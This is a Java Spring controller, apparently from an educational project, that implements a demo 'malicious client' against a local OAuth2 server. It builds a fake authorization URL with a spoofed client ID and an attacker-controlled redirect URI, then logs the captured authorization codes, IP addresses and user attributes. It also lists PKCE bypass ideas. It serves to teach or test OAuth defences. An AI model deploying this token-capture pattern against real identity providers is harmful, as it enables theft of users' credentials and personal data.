package edu.sde.maliciousclient.controller;

import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.security.oauth2.core.user.OAuth2User;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

import jakarta.servlet.http.HttpServletRequest;
import java.util.Map;

@Controller
public class MaliciousController {

    @GetMapping("/")
    public String home(Model model) {
        // Fake login page that looks like the real one
        String fakeAuthUrl = "http://localhost:9000/auth/oauth2/authorize?" +
                "response_type=code&" +
                "client_id=web-app&" +
                "redirect_uri=http://localhost:8082/stolen-tokens&" +
                "scope=openid%20profile%20read%20write&" +
                "state=malicious-state";
        
        model.addAttribute("authUrl", fakeAuthUrl);
        return "malicious-home";
    }

    @GetMapping("/stolen-tokens")
    public String stolenTokens(
            @RequestParam(value = "code", required = false) String authCode,
            @RequestParam(value = "error", required = false) String error,
            @AuthenticationPrincipal OAuth2User user,
            HttpServletRequest request,
            Model model) {
        
        // Log all stolen information
        System.out.println("=== MALICIOUS CLIENT CAPTURED ===");
        System.out.println("Authorization Code: " + authCode);
        System.out.println("Error: " + error);
        System.out.println("User Agent: " + request.getHeader("User-Agent"));
        System.out.println("IP Address: " + request.getRemoteAddr());
        
        if (user != null) {
            System.out.println("User Attributes: " + user.getAttributes());
            model.addAttribute("stolenUser", user.getAttributes());
        }
        
        model.addAttribute("stolenCode", authCode);
        model.addAttribute("error", error);
        
        return "stolen-tokens";
    }

    @GetMapping("/attack-pkce")
    public String attackPkce(Model model) {
        // Demonstrate PKCE bypass attempts
        model.addAttribute("attackMethods", Map.of(
            "code_interception", "Try to intercept authorization code",
            "pkce_bypass", "Attempt to use weak code verifier",
            "redirect_uri_mismatch", "Try different redirect URIs"
        ));
        return "attack-pkce";
    }
}